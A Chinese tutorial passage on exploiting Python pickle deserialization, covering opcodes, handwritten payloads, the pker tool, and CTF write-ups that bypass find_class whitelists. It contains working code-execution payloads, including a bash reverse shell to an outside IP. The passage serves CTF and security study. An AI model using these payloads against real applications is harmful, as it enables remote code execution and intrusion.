# pickle反序列化初探

- pickle反序列化初探
  - [前言](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#前言)
  - 基本知识
    - [pickle简介](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pickle简介)
    - [可序列化的对象](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#可序列化的对象)
    - [`object.__reduce__()` 函数](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#object__reduce__-函数)
  - pickle过程详细解读
    - opcode简介
      - [opcode版本](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#opcode版本)
    - [pickletools](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pickletools)
  - 漏洞利用
    - [利用思路](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#利用思路)
    - [初步认识：pickle EXP的简单demo](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#初步认识pickle-exp的简单demo)
    - 如何手写opcode
      - [常用opcode解析](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#常用opcode解析)
      - [拼接opcode](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#拼接opcode)
      - [全局变量覆盖](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#全局变量覆盖)
      - [函数执行](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#函数执行)
      - [实例化对象](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#实例化对象)
      - [pker的使用（推荐）](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pker的使用推荐)
      - [注意事项](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#注意事项)
    - CTF实战
      - [做题之前：了解`pickle.Unpickler.find_class()`](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#做题之前了解pickleunpicklerfind_class)
      - [Code-Breaking:picklecode](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#code-breakingpicklecode)
      - [watevrCTF-2019:Pickle Store](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#watevrctf-2019pickle-store)
      - [高校战疫网络安全分享赛:webtmp](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#高校战疫网络安全分享赛webtmp)
  - pker使用说明
    - [简介](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#简介)
    - [pker能做的事](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pker能做的事)
    - 使用方法与示例
      - [pker：全局变量覆盖](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pker全局变量覆盖)
      - [pker：函数执行](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pker函数执行)
      - [pker：实例化对象](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#pker实例化对象)
      - [手动辅助](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#手动辅助)
    - pker：CTF实战
      - [Code-Breaking: picklecode](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#code-breaking-picklecode)
      - [BalsnCTF:pyshv1](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#balsnctfpyshv1)
      - [BalsnCTF:pyshv2](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#balsnctfpyshv2)
      - [BalsnCTF:pyshv3](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#balsnctfpyshv3)
      - [watevrCTF-2019: Pickle Store](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#watevrctf-2019-pickle-store)
      - [SUCTF-2019:guess_game](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#suctf-2019guess_game)
      - [高校战疫网络安全分享赛: webtmp](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#高校战疫网络安全分享赛-webtmp)
  - [后记](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#后记)
  - [参考资料](https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7KaqAKqqUqEK%3Dx#参考资料)

## 前言

最近遇到有关pickle的CTF题，虽然被很多师傅们玩的差不多了，但是我也仔细学习了一波，尽可能详细地总结了pickle反序列化的相关知识。整篇文章介绍了pickle的基本原理、PVM、opcode解析的详细过程、CTF赛题实战和pker工具的使用，希望这篇文章能给初学pickle反序列化知识的童鞋带来帮助。文章内容比较多，如果文章中出现了错误请师傅们指正。

## 基本知识

### pickle简介

- 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。
- python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。
- 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。
- pickle实际上可以看作一种**独立的语言**，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。

### 可序列化的对象

- `None` 、 `True` 和 `False`
- 整数、浮点数、复数
- str、byte、bytearray
- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）

### `object.__reduce__()` 函数

- 在开发时，可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 `object.__reduce__()` 返回一个 `(callable, ([para1,para2...])[,...])` 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。
- 在下文pickle的opcode中， `R` 的作用与 `object.__reduce__()` 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 `R` 正好对应 `object.__reduce__()` 函数， `object.__reduce__()` 的返回值会作为 `R` 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 `R` 的。

## pickle过程详细解读

- pickle解析依靠Pickle Virtual Machine (PVM)进行。
- PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：
- 解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 `.` 停止。最终留在栈顶的值将被作为反序列化对象返回。
- 栈：由Python的list实现，被用来临时存储数据、参数以及对象。
- memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 `key-value` 的形式储存在memo中，以便后来使用。
- 为了便于理解，我把BH讲稿中的相关部分制成了动图，PVM解析 `str` 的过程动图：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20200320230631-6204866e-6abc-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20200320230631-6204866e-6abc-1.gif)

- PVM解析 `__reduce__()` 的过程动图：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif)

### opcode简介

#### opcode版本

- pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。

```
import pickle

a={'1': 1, '2': 2}

print(f'# 原变量：{a!r}')
for i in range(4):
    print(f'pickle版本{i}',pickle.dumps(a,protocol=i))

# 输出：
pickle版本0 b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'
pickle版本1 b'}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
pickle版本2 b'\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
pickle版本3 b'\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
```

- pickle3版本的opcode示例：

```
# 'abcd'
b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'

# \x80：协议头声明 \x03：协议版本
# \x04\x00\x00\x00：数据长度：4
# abcd：数据
# q：储存栈顶的字符串长度：一个字节（即\x00）
# \x00：栈顶位置
# .：数据截止
```

- pickle0版本的部分opcode表格：

| Opcode | Mnemonic | Data type loaded onto the stack | Example     |
| ------ | -------- | ------------------------------- | ----------- |
| S      | STRING   | String                          | S'foo'\n    |
| V      | UNICODE  | Unicode                         | Vfo\u006f\n |
| I      | INTEGER  | Integer                         | I42\n       |
| ...    | ...      | ...                             | ...         |

- 本表格截取了BH的pdf上的部分内容，完整表格可以直接在[原pdf](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)中找到。

### pickletools

- 使用pickletools可以方便的将opcode转化为便于肉眼读取的形式

```
import pickletools

data=b"\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b'1'\nkey2=b'2'q\x01\x85q\x02Rq\x03."
pickletools.dis(data)

    0: \x80 PROTO      3
    2: c    GLOBAL     'builtins exec'
   17: q    BINPUT     0
   19: X    BINUNICODE "key1=b'1'\nkey2=b'2'"
   43: q    BINPUT     1
   45: \x85 TUPLE1
   46: q    BINPUT     2
   48: R    REDUCE
   49: q    BINPUT     3
   51: .    STOP
highest protocol among opcodes = 2
```

## 漏洞利用

### 利用思路

- 任意代码执行或命令执行。
- 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。

### 初步认识：pickle EXP的简单demo

```
import pickle
import os

class genpoc(object):
    def __reduce__(self):
        s = """echo test >poc.txt"""  # 要执行的命令
        return os.system, (s,)        # reduce函数必须返回元组或字符串

e = genpoc()
poc = pickle.dumps(e)

print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令
```

- 变量覆盖

```
import pickle

key1 = b'321'
key2 = b'123'
class A(object):
    def __reduce__(self):
        return (exec,("key1=b'1'\nkey2=b'2'",))

a = A()
pickle_a = pickle.dumps(a)
print(pickle_a)
pickle.loads(pickle_a)
print(key1, key2)
```

### 如何手写opcode

- 在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 `__reduce__` 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。
- 在这里可以体会到为何pickle**是一种语言**，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。
- 根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。

#### 常用opcode解析

为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif)

由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是我经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下：

| opcode | 描述                                                         | 具体写法                                           | 栈上的变化                                                   | memo上的变化 |
| ------ | ------------------------------------------------------------ | -------------------------------------------------- | ------------------------------------------------------------ | ------------ |
| c      | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） | c[module]\n[instance]\n                            | 获得的对象入栈                                               | 无           |
| o      | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无           |
| i      | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 | 无           |
| N      | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               | 无           |
| S      | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               | 无           |
| V      | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               | 无           |
| I      | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               | 无           |
| F      | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               | 无           |
| R      | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             | 无           |
| .      | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           | 无           |
| (      | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 | 无           |
| t      | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| )      | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   | 无           |
| l      | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| ]      | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   | 无           |
| d      | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 | 无           |
| }      | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   | 无           |
| p      | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           | 对象被储存   |
| g      | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   | 无           |
| 0      | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               | 无           |
| b      | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           | 无           |
| s      | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 | 无           |
| u      | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     | 无           |
| a      | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       | 无           |
| e      | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     | 无           |

此外， `TRUE` 可以用 `I` 表示： `b'I01\n'` ； `FALSE` 也可以用 `I` 表示： `b'I00\n'` ，其他opcode可以在[pickle库的源代码](https://github.com/python/cpython/blob/master/Lib/pickle.py#L111)中找到。
由这些opcode我们可以得到一些需要注意的地方：

- 编写opcode时要想象栈中的数据，以正确使用每种opcode。
- 在理解时注意与python本身的操作对照（比如python列表的`append`对应`a`、`extend`对应`e`；字典的`update`对应`u`）。
- `c`操作符会尝试`import`库，所以在`pickle.loads`时不需要漏洞代码中先引入系统库。
- pickle不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。pickle能够索引查值的操作只有`c`、`i`。而如何查值也是CTF的一个重要考点。
- `s`、`u`、`b`操作符可以构造并赋值原来没有的属性、键值对。

#### 拼接opcode

将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。

#### 全局变量覆盖

python源码：

```
# secret.py
name='TEST3213qkfsmfo'
# main.py
import pickle
import secret

opcode='''c__main__
secret
(S'name'
S'1'
db.'''

print('before:',secret.name)

output=pickle.loads(opcode.encode())

print('output:',output)
print('after:',secret.name)
```

首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：

```
opcode='''c__main__
secret
(S'name'
S'1'
db.'''
```

#### 函数执行

与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：

1. `R` ：

```
b'''cos
system
(S'whoami'
tR.'''
```

1. `i` ：

```
b'''(S'whoami'
ios
system
.'''
```

1. `o` ：

```
b'''(cos
system
S'whoami'
o.'''
```

#### 实例化对象

实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：

```
class Student:
    def __init__(self, name, age):
        self.name = name
        self.age = age

data=b'''c__main__
Student
(S'XiaoMing'
S"20"
tR.'''

a=pickle.loads(data)
print(a.name,a.age)
```

#### pker的使用（推荐）

- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
- 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。

#### 注意事项

pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：

```
# linux(注意posix):
b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'

# windows(注意nt):
b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
```

### CTF实战

#### 做题之前：了解`pickle.Unpickler.find_class()`

由于官方针对pickle的安全问题的建议是修改`find_class()`，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。
什么时候会调用`find_class()`：

1. 从opcode角度看，当出现`c`、`i`、`b'\x93'`时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。
2. 从python代码来看，`find_class()`只会在解析opcode时调用一次，所以只要绕过opcode执行过程，`find_class()`就不会再调用，也就是说`find_class()`只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过`__import__`绕过一些黑名单。

下面先看两个例子：

```
safe_builtins = {'range','complex','set','frozenset','slice',}

class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name in safe_builtins:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__': # 只允许__main__模块
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
```

- 第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为`{'range','complex','set','frozenset','slice',}`。
- 第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许`__main__`模块。虽然看起来很安全，但是被引入主程序的模块都可以通过`__main__`调用修改，所以造成了变量覆盖。

由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过`find_class`函数内的限制就是pickle反序列化解题的关键。
此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:)

#### Code-Breaking:picklecode

题目将pickle能够引入的模块限定为`builtins`，并且设置了子模块黑名单：`{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}`，于是我们能够**直接**利用的模块有：

- `builtins`模块中，黑名单外的子模块。
- 已经`import`的模块：`io`、`builtins`（需要先利用`builtins`模块中的函数）

黑名单中没有`getattr`，所以可以通过`getattr`获取`io`或`builtins`的子模块以及子模块的子模块:)，而`builtins`里有`eval、exec`等危险函数，即使在黑名单中，也可以通过`getattr`获得。pickle不能直接获取`builtins`一级模块，但可以通过`builtins.globals()`获得`builtins`；这样就可以执行任意代码了。payload为：

```
b'''cbuiltins
getattr
p0
(cbuiltins
dict
S'get'
tRp1
cbuiltins
globals
)Rp2
00g1
(g2
S'builtins'
tRp3
0g0
(g3
S'eval'
tR(S'__import__("os").system("whoami")'
tR.
'''
```

#### watevrCTF-2019:Pickle Store

因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload：

```
b'''cos
system
(S"bash -c 'bash -i >& /dev/tcp/192.168.11.21/8888 0>&1'"
tR.
'''
```

#### 高校战疫网络安全分享赛:webtmp

限制中，改写了`find_class`函数，只能生成`__main__`模块的pickle：

```
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__': # 只允许__main__模块
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
```

此外，禁止了`b'R'`：

```
try:
    pickle_data = request.form.get('data')
    if b'R' in base64.b64decode(pickle_data): 
        return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
```

目标是覆盖secret中的验证，由于secret被主程序引入，是存在于`__main__`下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：

```
b'''c__main__
secret
(S'name'
S"1"
S"category"
S"2"
db0(S"1"
S"2"
i__main__
Animal
.'''
```

除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。

## pker使用说明

### 简介

- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。
- 使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。
- 再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
- 此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。

### pker能做的事

引用自https://xz.aliyun.com/t/7012#toc-5：

> - 变量赋值：存到memo中，保存memo下标和变量名即可
> - 函数调用
> - 类型字面量构造
> - list和dict成员修改
> - 对象成员变量修改

具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。

### 使用方法与示例

1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：

```
以下module都可以是包含`.`的子module
调用函数时，注意传入的参数类型要和示例一致
对应的opcode会被生成，但并不与pker代码相互等价

GLOBAL
对应opcode：b'c'
获取module下的一个全局对象（没有import的也可以，比如下面的os）：
GLOBAL('os', 'system')
输入：module,instance(callable、module都是instance)  

INST
对应opcode：b'i'
建立并入栈一个对象（可以执行一个函数）：
INST('os', 'system', 'ls')  
输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
```

注意：

1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:

```
test="123"
return test
```

被解析为：

```
b"S'123'\np0\n0g0\n."
```

#### pker：全局变量覆盖

- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：

```
secret=GLOBAL('__main__', 'secret') 
# python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
```

- 覆盖引入模块的变量：

```
game = GLOBAL('guess_game', 'game')
game.curr_ticket = '123'
```

接下来会给出一些具体的基本操作的实例。

#### pker：函数执行

- 通过`b'R'`调用：

```
s='whoami'
system = GLOBAL('os', 'system')
system(s) # `b'R'`调用
return
```

- 通过`b'i'`调用：

```
INST('os', 'system', 'whoami')
```

- 通过`b'c'`与`b'o'`调用：

```
OBJ(GLOBAL('os', 'system'), 'whoami')
```

- 多参数调用函数

```
INST('[module]', '[callable]'[, par0,par1...])
OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
```

#### pker：实例化对象

- 实例化对象是一种特殊的函数执行

```
animal = INST('__main__', 'Animal','1','2')
return animal


# 或者

animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
return animal
```

- 其中，python原文件中包含：

```
class Animal:

    def __init__(self, name, category):
        self.name = name
        self.category = category
```

- 也可以先实例化再赋值：

```
animal = INST('__main__', 'Animal')
animal.name='1'
animal.category='2'
return animal
```

#### 手动辅助

- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
- 建立普通的类时，可以先pickle.dumps，再拼接至payload。

### pker：CTF实战

- 在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。

#### Code-Breaking: picklecode

解析思路见前文手写opcode的CTF实战部分，pker代码为：

```
getattr=GLOBAL('builtins','getattr')
dict=GLOBAL('builtins','dict')
dict_get=getattr(dict,'get')
glo_dic=GLOBAL('builtins','globals')()
builtins=dict_get(glo_dic,'builtins')
eval=getattr(builtins,'eval')
eval('print("123")')
return
```

#### BalsnCTF:pyshv1

题目的`find_class`只允许`sys`模块，并且对象名中不能有`.`号。意图很明显，限制子模块，只允许一级模块。
`sys`模块有一个字典对象`modules`，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。`modules`中还包括了`sys`本身。我们可以利用自己包含自己这点绕过限制，具体过程为：

1. 由于`sys`自身被包含在自身的子类里，我们可以利用这点使用`s`赋值，向后递进一级，引入`sys.modules`的子模块：`sys.modules['sys']=sys.modules`，此时就相当于`sys=sys.modules`。这样我们就可以利用原`sys.modules`下的对象了，即`sys.modules.xxx`。
2. 首先获取`modules`的`get`函数，然后类似于上一步，再使用`s`把`modules`中的`sys`模块更新为`os`模块：`sys['sys']=sys.get('os')`。
3. 使用`c`获取`system`，之后就可以执行系统命令了。

整个利用过程还是很巧妙的，pker代码为：

```
modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('whoami')
return
```

#### BalsnCTF:pyshv2

与v1类似，题目的`find_class`只允许`structs`模块，并且对象名中不能有`.`号，只允许一级模块。其中，`structs`是个空模块。但是在`find_class`中调用了`__import__`函数：

```
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        module = __import__(module) # 注意这里调用了__import__
        return getattr(module, name)
```

注意python的以下几条性质：

